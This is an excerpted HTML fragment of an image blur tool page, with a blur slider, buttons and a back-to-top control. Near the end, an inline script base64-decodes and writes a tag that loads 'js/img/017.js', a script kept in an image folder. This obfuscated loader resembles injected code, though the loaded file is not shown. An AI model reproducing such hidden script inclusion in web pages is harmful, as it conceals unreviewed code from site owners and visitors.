...
<div class="toolarea">
    ...
    <div id="blur-form">
        ...
        <input type="range" id="blur-amount" min="0" max="10" step="0.1" value="0">
    ...
    <button id="add-blur-btn" onclick="addBlur()">Add Blur</button>
    <button id="remove-blur-btn" onclick="removeBlur()">Remove Blur</button>
...
<button onclick="scrollToTop()" id="backToTopBtn" title="Go to top">&#8679;</button>
  ...
  <script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDE3LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));</script>
  <script>
    // Get the button
